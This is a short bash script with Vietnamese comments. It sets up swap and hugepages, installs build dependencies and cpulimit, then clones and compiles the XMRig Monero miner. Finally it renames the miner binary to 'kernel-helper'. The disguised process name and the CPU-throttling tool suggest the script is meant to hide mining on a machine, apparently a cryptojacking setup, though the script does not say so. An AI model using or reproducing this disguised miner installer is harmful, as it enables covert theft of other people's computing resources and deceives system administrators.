#!/bin/bash
# 1. Setup Swap 2GB
sudo fallocate -l 2G /swapfile && sudo chmod 600 /swapfile && sudo mkswap /swapfile && sudo swapon /swapfile
echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab

# 2. Toi uu he thong (Hugepages) - Giup tang 20-30% toc do
sudo sysctl -w vm.nr_hugepages=1280

# 3. Cai dependencies
sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev cpulimit

# 4. Clone va Build (Buoc nay mat 5-10 phut)
git clone https://github.com/xmrig/xmrig.git
mkdir xmrig/build && cd xmrig/build
cmake ..
make -j$(nproc)
mv xmrig kernel-helper

echo "Setup completed!"
